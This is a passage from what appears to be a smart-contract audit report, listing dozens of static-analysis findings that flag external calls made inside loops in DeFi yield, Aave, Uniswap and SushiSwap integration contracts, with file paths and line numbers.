-204) has external calls inside a loop : IIntegration ( integration ). withdraw ( token , actualBalance - desiredBalance ) ( contracts / core / YieldManager . sol #196 -199) 52 53 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : IIntegration ( integrationMap . getIntegrationAddress ( integrationId )) . harvestYield () ( contracts / core / YieldManager . sol #228 -229) 54 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / core / YieldManager . sol #233 -235) 55 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : harvestedTokenAmount = token . balanceOf ( address ( this )) ( contracts / core / YieldManager . sol #242) 56 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , tokenDesiredReserve - tokenActualReserve ) ( contracts / core / YieldManager . sol #252 -255) 57 YieldManager . harvestYield () ( contracts / core / YieldManager . sol #216 -265) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , token . balanceOf ( address ( this ))) ( contracts / core / YieldManager . sol #258 -261) 58 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / core / YieldManager . sol #278 -280) 59 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : token . balanceOf ( address ( this )) > 0 ( contracts / core / YieldManager . sol #282) 60 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : wethBalanceBefore = weth . balanceOf ( address ( this )) ( contracts / core / YieldManager . sol #287) 61 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : token . safeTransfer ( moduleMap . getModuleAddress ( Modules . UniswapTrader ) , token . balanceOf ( address ( this )) ) ( contracts / core / YieldManager . sol #290 -293) 62 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . swapExactInput ( address ( token ) , address ( weth ) , address ( this ) , token . balanceOf ( moduleMap . getModuleAddress ( Modules . UniswapTrader ))) ( contracts / core / YieldManager . sol #295 -301) 63 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : wethReceived = weth 53 . balanceOf ( address ( this )) - wethBalanceBefore ( contracts / core / YieldManager . sol #303) 64 YieldManager . processYield () ( contracts / core / YieldManager . sol #268 -315) has external calls inside a loop : wethReceived = weth . balanceOf ( address ( this )) - getProcessedWethByTokenSum () ( contracts / core / YieldManager . sol #306 -308) 65 YieldManager . ethToRewards ( uint256 ) ( contracts / core / YieldManager . sol #416 -452) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / core / YieldManager . sol #430) 66 YieldManager . ethToRewards ( uint256 ) ( contracts / core / YieldManager . sol #416 -452) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )) . increaseEthRewards ( tokenAddress ,( ethRewardsAmount * processedWethByToken [ tokenAddress ]) / processedWethByTokenSum ) ( contracts / core / YieldManager . sol #433 -438) 67 YieldManager . getProcessedWethSum () ( contracts / core / YieldManager . sol #572 -588) has external calls inside a loop : tokenAddress = IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )). getTokenAddress ( tokenId ) ( contracts / core / YieldManager . sol #583 -585) 68 YieldManager . getProcessedWethByTokenSum () ( contracts / core / YieldManager . sol #602 -618) has external calls inside a loop : processedWethByTokenSum += processedWethByToken [ integrationMap . getTokenAddress ( tokenId )] ( contracts / core / YieldManager . sol #614 -616) 69 YieldManager . getTokenTotalIntegrationBalance ( address ) ( contracts / core / YieldManager . sol #622 -642) has external calls inside a loop : tokenTotalIntegrationBalance += IIntegration ( integrationMap . getIntegrationAddress ( integrationId )) . getBalance ( tokenAddress ) ( contracts / core / YieldManager . sol #638 -640) 70 AaveIntegration . deploy () ( contracts / yield - integrations / AaveIntegration . sol #88 -115) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / yield - integrations / AaveIntegration . sol #95 -97) 71 AaveIntegration . deploy () ( contracts / yield - integrations / AaveIntegration . sol #88 -115) has external calls inside a loop : tokenAmount = token . balanceOf ( address ( this )) ( contracts / yield - integrations / AaveIntegration . sol #98) 72 AaveIntegration . deploy () ( contracts / yield - integrations / AaveIntegration . sol #88 -115) has external calls inside a loop : token . allowance ( address ( this ) , lendingPoolAddress ) == 0 ( contracts / yield - integrations / AaveIntegration . sol #100) 54 73 AaveIntegration . deploy () ( contracts / yield - integrations / AaveIntegration . sol #88 -115) has external calls inside a loop : IAaveLendingPool ( lendingPoolAddress ). deposit ( address ( token ) , tokenAmount , address ( this ) ,0) ( contracts / yield - integrations / AaveIntegration . sol #105 -112) 74 AaveIntegration . harvestYield () ( contracts / yield - integrations / AaveIntegration . sol #118 -141) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / AaveIntegration . sol #125) 75 AaveIntegration . harvestYield () ( contracts / yield - integrations / AaveIntegration . sol #118 -141) has external calls inside a loop : aTokenBalance = IERC20MetadataUpgradeable ( aTokenAddress ). balanceOf ( address ( this )) ( contracts / yield - integrations / AaveIntegration . sol #128 -129) 76 AaveIntegration . harvestYield () ( contracts / yield - integrations / AaveIntegration . sol #118 -141) has external calls inside a loop : IAaveLendingPool ( lendingPoolAddress ). withdraw ( tokenAddress , aTokenBalance - balances [ tokenAddress ], address ( moduleMap . getModuleAddress ( Modules . YieldManager )) ) ( contracts / yield - integrations / AaveIntegration . sol #131 -137) 77 DynamicRangeOrdersIntegration . _deploy () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #269 -337) has external calls inside a loop : token0Id = integrationMap . getTokenId ( liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. token0 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #307 -309) 78 DynamicRangeOrdersIntegration . _deploy () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #269 -337) has external calls inside a loop : token1Id = integrationMap . getTokenId ( liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. token1 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #310 -312) 79 DynamicRangeOrdersIntegration . transferTokensTodynamicRangeOrdersIntegrationDeployer () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #365 -392) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #372 -374) 80 DynamicRangeOrdersIntegration . transferTokensTodynamicRangeOrdersIntegrationDeployer () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #365 -392) has external calls inside a loop : token . allowance ( address ( dynamicRangeOrdersIntegrationDeployer ) , address ( this )) 55 == 0 ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #377 -380) 81 DynamicRangeOrdersIntegration . transferTokensTodynamicRangeOrdersIntegrationDeployer () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #365 -392) has external calls inside a loop : dynamicRangeOrdersIntegrationDeployer . tokenApprovals ( address ( token )) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #382) 82 DynamicRangeOrdersIntegration . transferTokensTodynamicRangeOrdersIntegrationDeployer () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #365 -392) has external calls inside a loop : token . balanceOf ( address ( this )) > 0 ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #385) 83 DynamicRangeOrdersIntegration . transferTokensTodynamicRangeOrdersIntegrationDeployer () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #365 -392) has external calls inside a loop : token . safeTransfer ( address ( dynamicRangeOrdersIntegrationDeployer ) , token . balanceOf ( address ( this ))) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #386 -389) 84 DynamicRangeOrdersIntegration . increaseLiquidityPositions ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #395 -465) has external calls inside a loop : dynamicRangeOrdersIntegrationDeployer . increaseLiquidityPosition ( liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. id , liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. token0 , liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. token1 , amount0Desired , amount1Desired ) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #415 -424) 85 DynamicRangeOrdersIntegration . increaseLiquidityPositions ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #395 -465) has external calls inside a loop : ( success , liquidityPositionId ) = dynamicRangeOrdersIntegrationDeployer . mintLiquidityPosition ( liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. token0 , liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. token1 , liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. feeNumerator , liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. tickLower , liquidityPositions [ liquidityPositionKeys [ liquidityPositionIndex ]]. tickUpper , amount0Desired_scope_0 , amount1Desired_scope_1 ) ( contracts / yield 56 - integrations / DynamicRangeOrdersIntegration . sol #437 -453) 86 DynamicRangeOrdersIntegration . closeExcessLiquidityPositions () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #521 -547) has external calls inside a loop : dynamicRangeOrdersIntegrationDeployer . decreaseLiquidityPosition ( liquidityPositionKeys [ liquidityPositionIndex ], positionActualBaseStablecoinValue - positionDesiredBaseStablecoinValue ) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #541 -544) 87 DynamicRangeOrdersIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #600 -629) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #610) 88 DynamicRangeOrdersIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #600 -629) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . getTokenPairPoolsLength ( tokenAddress , getBaseStablecoinAddress () ) > 0 ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #613 -615) 89 DynamicRangeOrdersIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #600 -629) has external calls inside a loop : baseStablecoinReserveBalance += getTokenValueInBaseStablecoin ( tokenAddress , IERC20MetadataUpgradeable ( tokenAddress ). balanceOf ( address ( dynamicRangeOrdersIntegrationDeployer )) ) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #617 -622) 90 DynamicRangeOrdersIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #600 -629) has external calls inside a loop : baseStablecoinReserveBalance += IERC20MetadataUpgradeable ( tokenAddress ). balanceOf ( address ( dynamicRangeOrdersIntegrationDeployer )) ( contracts / yield - integrations / DynamicRangeOrdersIntegration . sol #625 -626) 91 DynamicRangeOrdersIntegrationDeployer . swapExcessTokensForBaseStablecoin ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #85 -120) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #98) 92 DynamicRangeOrdersIntegrationDeployer . swapExcessTokensForBaseStablecoin ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #85 -120) 57 has external calls inside a loop : tokenBalance = token . balanceOf ( address ( this )) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #104) 93 DynamicRangeOrdersIntegrationDeployer . swapExcessTokensForBaseStablecoin ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #85 -120) has external calls inside a loop : uniswapTrader . swapExactInput ( tokenAddress , baseStablecoinAddress , address ( this ) , tokenBalance - tokenDesiredAmounts [ tokenId ]) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #111 -116) 94 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : integrationMap . getTokenAddress ( tokenId ) != baseStablecoinAddress ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #136) 95 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #137) 96 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : tokenBalance = token . balanceOf ( address ( this )) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #141) 97 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : baseStablecoinAmount = dynamicRangeOrdersIntegration . getTokenValueInBaseStablecoin ( tokenAddress , tokenDesiredAmounts [ tokenId ] - tokenBalance ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #144 -148) 98 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : baseStablecoinAmount > IERC20MetadataUpgradeable ( baseStablecoinAddress ). balanceOf ( address ( this )) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #150 -153) 58 99 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : baseStablecoinAmount = IERC20MetadataUpgradeable ( baseStablecoinAddress ). balanceOf ( address ( this )) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #155 -157) 100 DynamicRangeOrdersIntegrationDeployer . swapExcessBaseStablecoinForTokens ( uint256 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #123 -173) has external calls inside a loop : uniswapTrader . swapExactInput ( baseStablecoinAddress , tokenAddress , address ( this ) , baseStablecoinAmount ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #164 -169) 101 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : dynamicRangeOrdersIntegration . getPositionBaseStablecoinValue ( liquidityPositionKeys [ liquidityPositionIndex ]) + dynamicRangeOrdersIntegration . getTokenValueInBaseStablecoin ( tokenAddress , token . balanceOf ( address ( this ))) <= withdrawalAmountInBaseStablecoinValue ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #310 -317) 102 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : decreaseLiquidityPosition ( liquidityPositionKeys [ liquidityPositionIndex ], dynamicRangeOrdersIntegration . getPositionBaseStablecoinValue ( liquidityPositionKeys [ liquidityPositionIndex ]) ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #320 -325) 103 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : token . balanceOf ( address ( this )) >= amount ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #327) 104 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : liquidityPositionIndex == dynamicRangeOrdersIntegration . getLiquidityPositionsCount () - 1 59 ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #364 -365) 105 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : decreaseLiquidityPosition ( liquidityPositionKeys [ liquidityPositionIndex ] ,(102 * ( withdrawalAmountInBaseStablecoinValue - dynamicRangeOrdersIntegration . getTokenValueInBaseStablecoin ( tokenAddress , token . balanceOf ( address ( this )) ))) / 100) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #332 -340) 106 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : token . balanceOf ( address ( this )) >= amount ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #344) 107 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : decreaseLiquidityPosition ( liquidityPositionKeys [ liquidityPositionIndex ], dynamicRangeOrdersIntegration . getPositionBaseStablecoinValue ( liquidityPositionKeys [ liquidityPositionIndex ]) ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #349 -354) 108 DynamicRangeOrdersIntegrationDeployer . closePositionsForWithdrawal ( bytes32 [] , address , uint256 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #296 -373) has external calls inside a loop : token . balanceOf ( address ( this )) >= amount ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #356) 109 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : liquidityPositionIndex < dynamicRangeOrdersIntegration . getLiquidityPositionsCount () ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #506 -507) 110 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : ( token0 , token1 , liquidityPositionId ) = 60 dynamicRangeOrdersIntegration . getLiquidityPosition ( liquidityPositionKeys [ liquidityPositionIndex ]) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #510 -521) 111 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : token0Id = integrationMap . getTokenId ( token0 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #523) 112 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : token1Id = integrationMap . getTokenId ( token1 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #524) 113 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #546) 114 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : tokenAddress == baseStablecoinAddress || IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )). getTokenPairPoolsLength ( tokenAddress , baseStablecoinAddress ) > 0 ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #550 -553) 115 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : tokenBalanceBaseStablecoinValue = dynamicRangeOrdersIntegration . getTokenValueInBaseStablecoin ( tokenAddress , dynamicRangeOrdersIntegration . getBalance ( tokenAddress )) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #555 -559) 116 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : IERC20MetadataUpgradeable ( tokenAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . UniswapTrader ) , tokensHarvestedYield [ tokenId ]) ( contracts / yield - integrations / 61 DynamicRangeOrdersIntegrationDeployer . sol #566 -569) 117 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . swapExactInput ( tokenAddress , baseStablecoinAddress , address ( this ) , tokensHarvestedYield [ tokenId ]) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #570 -576) 118 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : tokenAddress_scope_1 = integrationMap . getTokenAddress ( tokenId_scope_0 ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #590) 119 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : IERC20MetadataUpgradeable ( baseStablecoinAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . UniswapTrader ) , baseStablecoinAmount ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #597 -600) 120 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . swapExactInput ( baseStablecoinAddress , tokenAddress_scope_1 , moduleMap . getModuleAddress ( Modules . YieldManager ) , baseStablecoinAmount ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #602 -608) 121 DynamicRangeOrdersIntegrationDeployer . harvestYield ( bytes32 []) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #485 -618) has external calls inside a loop : IERC20MetadataUpgradeable ( baseStablecoinAddress ). safeTransfer ( moduleMap . getModuleAddress ( Modules . YieldManager ) , baseStablecoinAmount ) ( contracts / yield - integrations / DynamicRangeOrdersIntegrationDeployer . sol #610 -613) 122 SushiSwapIntegration . withdraw ( address , uint256 ) ( contracts / yield - integrations / SushiSwapIntegration . sol #307 -333) has external calls inside a loop : IERC20MetadataUpgradeable ( token ). safeTransfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , ethReserve - ( eth - amount )) ( contracts / yield - integrations / SushiSwapIntegration . sol #319) 62 123 SushiSwapIntegration . withdraw ( address , uint256 ) ( contracts / yield - integrations / SushiSwapIntegration . sol #307 -333) has external calls inside a loop : IERC20MetadataUpgradeable ( token ). safeTransfer ( moduleMap . getModuleAddress ( Modules . Kernel ) , ethReserve ) ( contracts / yield - integrations / SushiSwapIntegration . sol #319) 124 UniswapIntegration . _deploy () ( contracts / yield - integrations / UniswapIntegration . sol #282 -349) has external calls inside a loop : token0Id = integrationMap . getTokenId ( liquidityPositions [ liquidityPositionIndex ]. token0 ) ( contracts / yield - integrations / UniswapIntegration . sol #320 -322) 125 UniswapIntegration . _deploy () ( contracts / yield - integrations / UniswapIntegration . sol #282 -349) has external calls inside a loop : token1Id = integrationMap . getTokenId ( liquidityPositions [ liquidityPositionIndex ]. token1 ) ( contracts / yield - integrations / UniswapIntegration . sol #323 -325) 126 UniswapIntegration . transferTokensToUniswapIntegrationDeployer () ( contracts / yield - integrations / UniswapIntegration . sol #377 -402) has external calls inside a loop : token = IERC20MetadataUpgradeable ( integrationMap . getTokenAddress ( tokenId )) ( contracts / yield - integrations / UniswapIntegration . sol #384 -386) 127 UniswapIntegration . transferTokensToUniswapIntegrationDeployer () ( contracts / yield - integrations / UniswapIntegration . sol #377 -402) has external calls inside a loop : token . balanceOf ( address ( this ) ) > 0 ( contracts / yield - integrations / UniswapIntegration . sol #388) 128 UniswapIntegration . transferTokensToUniswapIntegrationDeployer () ( contracts / yield - integrations / UniswapIntegration . sol #377 -402) has external calls inside a loop : token . allowance ( address ( uniswapIntegrationDeployer ) , address ( this )) == 0 ( contracts / yield - integrations / UniswapIntegration . sol #390 -391) 129 UniswapIntegration . transferTokensToUniswapIntegrationDeployer () ( contracts / yield - integrations / UniswapIntegration . sol #377 -402) has external calls inside a loop : uniswapIntegrationDeployer . tokenApprovals ( address ( token )) ( contracts / yield - integrations / UniswapIntegration . sol #393) 130 UniswapIntegration . transferTokensToUniswapIntegrationDeployer () ( contracts / yield - integrations / UniswapIntegration . sol #377 -402) has external calls inside a loop : token . safeTransfer ( address ( uniswapIntegrationDeployer ) , token . balanceOf ( address ( this )) ) ( contracts / yield - integrations / UniswapIntegration . sol #396 -399) 131 UniswapIntegration . increaseLiquidityPositions ( uint256 []) ( contracts / yield - integrations / UniswapIntegration . sol #405 -464) has external calls inside a loop : uniswapIntegrationDeployer . 63 increaseLiquidityPosition ( liquidityPositions [ liquidityPositionIndex ]. id , liquidityPositions [ liquidityPositionIndex ]. token0 , liquidityPositions [ liquidityPositionIndex ]. token1 , amount0Desired , amount1Desired ) ( contracts / yield - integrations / UniswapIntegration . sol #424 -430) 132 UniswapIntegration . increaseLiquidityPositions ( uint256 []) ( contracts / yield - integrations / UniswapIntegration . sol #405 -464) has external calls inside a loop : ( success , liquidityPositionId ) = uniswapIntegrationDeployer . mintLiquidityPosition ( liquidityPositions [ liquidityPositionIndex ]. token0 , liquidityPositions [ liquidityPositionIndex ]. token1 , liquidityPositions [ liquidityPositionIndex ]. feeNumerator , liquidityPositions [ liquidityPositionIndex ]. tickLower , liquidityPositions [ liquidityPositionIndex ]. tickUpper , amount0Desired_scope_0 , amount1Desired_scope_1 ) ( contracts / yield - integrations / UniswapIntegration . sol #443 -454) 133 UniswapIntegration . closeExcessLiquidityPositions () ( contracts / yield - integrations / UniswapIntegration . sol #467 -493) has external calls inside a loop : uniswapIntegrationDeployer . decreaseLiquidityPosition ( liquidityPositionIndex , positionActualBaseStablecoinValue - positionDesiredBaseStablecoinValue ) ( contracts / yield - integrations / UniswapIntegration . sol #487 -490) 134 UniswapIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / UniswapIntegration . sol #546 -575) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / UniswapIntegration . sol #556) 135 UniswapIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / UniswapIntegration . sol #546 -575) has external calls inside a loop : IUniswapTrader ( moduleMap . getModuleAddress ( Modules . UniswapTrader )) . getTokenPairPoolsLength ( tokenAddress , getBaseStablecoinAddress () ) > 0 ( contracts / yield - integrations / UniswapIntegration . sol #559 -561) 136 UniswapIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / UniswapIntegration . sol #546 -575) has external calls inside a loop : baseStablecoinReserveBalance += getTokenValueInBaseStablecoin ( tokenAddress , IERC20MetadataUpgradeable ( tokenAddress ). balanceOf ( address ( uniswapIntegrationDeployer )) ) ( contracts / yield - integrations / UniswapIntegration . sol #563 -568) 137 UniswapIntegration . getBaseStablecoinReserveBalance () ( contracts / yield - integrations / UniswapIntegration . sol #546 -575) has external calls inside a loop : baseStablecoinReserveBalance += 64 IERC20MetadataUpgradeable ( tokenAddress ). balanceOf ( address ( uniswapIntegrationDeployer )) ( contracts / yield - integrations / UniswapIntegration . sol #571 -572) 138 UniswapIntegrationDeployer . swapExcessTokensForBaseStablecoin ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #83 -118) has external calls inside a loop : tokenAddress = integrationMap . getTokenAddress ( tokenId ) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #96) 139 UniswapIntegrationDeployer . swapExcessTokensForBaseStablecoin ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #83 -118) has external calls inside a loop : tokenBalance = token . balanceOf ( address ( this )) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #102) 140 UniswapIntegrationDeployer . swapExcessTokensForBaseStablecoin ( uint256 []) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #83 -118) has external calls inside a loop : uniswapTrader . swapExactInput ( tokenAddress , baseStablecoinAddress , address ( this ) , tokenBalance - tokenDesiredAmounts [ tokenId ]) ( contracts / yield - integrations / UniswapIntegrationDeployer . sol #109 -114) 141 